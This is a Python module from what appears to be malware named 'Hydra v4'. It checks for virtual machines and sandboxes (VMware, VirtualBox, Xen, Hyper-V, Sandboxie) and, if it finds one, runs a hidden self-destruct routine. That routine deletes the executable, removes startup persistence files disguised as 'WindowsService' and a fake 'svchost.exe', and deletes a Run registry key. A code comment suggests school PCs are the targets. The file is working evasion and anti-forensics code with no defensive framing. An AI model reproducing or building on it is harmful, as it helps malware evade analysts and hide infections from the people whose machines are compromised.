"""
Hydra v4 — Sandbox / VM detection + self-destruct.
Runs BEFORE anything else. If VM detected, nuke and exit.
"""
import os
import sys
import ctypes
import tempfile
import time


def detect_vm() -> bool:
    """Return True if we're running in a VM or sandbox."""
    checks = [
        _check_processes,
        _check_registry,
        _check_files,
        _check_devices,
        _check_mac,
        _check_disk,
        _check_sandboxie,
    ]
    for check in checks:
        try:
            if check():
                return True
        except:
            continue
    return False


def _check_processes() -> bool:
    """Look for VM processes."""
    vm_procs = [
        "vmtoolsd", "vmwaretray", "vmwareuser",
        "vboxservice", "vboxtray", "vboxcontrol",
        "xenservice", "prl_tools", "prl_cc",
        "vmsrvc", "vmusrvc",
    ]
    try:
        import subprocess
        out = subprocess.run(
            "tasklist /FI \"STATUS eq running\" /FO CSV /NH",
            shell=True, capture_output=True, text=True, timeout=10
        ).stdout.lower()
        for proc in vm_procs:
            if proc in out:
                return True
    except:
        pass
    return False


def _check_registry() -> bool:
    """Check registry for VM artifacts."""
    paths = [
        r"SOFTWARE\VMware, Inc.\VMware Tools",
        r"SOFTWARE\Oracle\VirtualBox Guest Additions",
        r"SYSTEM\CurrentControlSet\Services\vmmouse",
        r"SYSTEM\CurrentControlSet\Services\vmx_svga",
        r"SYSTEM\CurrentControlSet\Services\VBoxSF",
        r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD*",  # VMware
        r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE*",  # VirtualBox
    ]
    try:
        import winreg
        for path in paths:
            try:
                parts = path.split("\\", 1)
                with winreg.OpenKey(
                    getattr(winreg, "HKEY_LOCAL_MACHINE"),
                    parts[1] if len(parts) > 1 else parts[0],
                    0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY
                ):
                    return True
            except:
                continue
    except:
        pass
    return False


def _check_files() -> bool:
    """Look for VM-related files."""
    paths = [
        r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
        r"C:\Program Files\Oracle\VirtualBox Guest Additions",
        r"C:\Windows\System32\drivers\VBoxMouse.sys",
        r"C:\Windows\System32\drivers\vm3dmp.sys",
        r"C:\Windows\System32\drivers\vmmouse.sys",
        r"C:\Windows\System32\drivers\vmhgfs.sys",
    ]
    for p in paths:
        if os.path.exists(p):
            return True
    return False


def _check_devices() -> bool:
    """Check for VM hardware via WMI."""
    vendor_names = [
        "vmware", "virtualbox", "qemu", "xen",
        "innotek", "oracle",
    ]
    try:
        import subprocess
        out = subprocess.run(
            "wmic baseboard get manufacturer,product /format:csv 2>nul",
            shell=True, capture_output=True, text=True, timeout=10
        ).stdout.lower()
        for name in vendor_names:
            if name in out:
                return True
    except:
        pass
    return False


def _check_mac() -> bool:
    """Check MAC address for VM OUI prefixes."""
    vm_oui = [
        "00:05:69", "00:0c:29", "00:1c:14", "00:50:56",  # VMware
        "08:00:27",  # VirtualBox
        "00:16:3e",  # Xen
        "00:15:5d",  # Hyper-V
        "00:03:ff",  # Microsoft Virtual PC
    ]
    try:
        import uuid
        node = uuid.getnode()
        mac = ":".join(f"{(node >> (i*8)) & 0xFF:02x}" for i in reversed(range(6)))
        mac_prefix = mac[:8].lower()
        for oui in vm_oui:
            if mac_prefix.startswith(oui.lower()):
                return True
    except:
        pass
    return False


def _check_disk() -> bool:
    """Check disk size (VMs often have very small or very round sizes)."""
    try:
        import ctypes
        free = ctypes.c_ulonglong(0)
        total = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetDiskFreeSpaceExW(
            "C:\\", None, ctypes.byref(total), ctypes.byref(free)
        )
        gb = total.value / (1024**3)
        if gb < 20:  # Truly tiny disk (<20GB = almost certainly a VM)
            return True
        # Budget school PCs often have 32-64GB — don't flag those
    except:
        pass
    return False


def _check_sandboxie() -> bool:
    """Detect Sandboxie via its DLL."""
    try:
        ctypes.windll.kernel32.GetModuleHandleW("SbieDll.dll")
        return True
    except:
        pass
    return False


# ─── Self-Destruct ──────────────────────────────────────

def self_destruct():
    """Delete ourselves and all traces."""
    exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__

    # Schedule batch file to clean up after we exit
    bat_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
    with open(bat_path, 'w') as f:
        f.write('@echo off\n')
        f.write(':retry\n')
        f.write(f'del /f /q \"{exe_path}\" 2>nul\n')
        f.write(f'if exist \"{exe_path}\" goto retry\n')
        f.write(f'del /f /q \"{bat_path}\" 2>nul\n')

    # Also nuke any known persistence files
    cleanup_paths = [
        os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows",
                     "Start Menu", "Programs", "Startup", "WindowsService.ps1"),
        os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows",
                     "Start Menu", "Programs", "Startup", "WindowsService.vbs"),
        os.path.join(tempfile.gettempdir(), "svchost.exe"),
        os.path.join(tempfile.gettempdir(), "hydra_dev.log"),
        os.path.join(tempfile.gettempdir(), "hydra_demo.log"),
    ]
    for p in cleanup_paths:
        try:
            if os.path.exists(p):
                os.remove(p)
        except:
            pass

    # Remove registry run key
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as key:
            try:
                winreg.DeleteValue(key, "WindowsService")
            except:
                pass
    except:
        pass

    # Launch cleanup batch
    try:
        import subprocess
        subprocess.Popen(
            f'cmd.exe /c start /min \"\" cmd /c \"{bat_path}\"',
            shell=True, creationflags=0x08000000  # CREATE_NO_WINDOW
        )
    except:
        pass
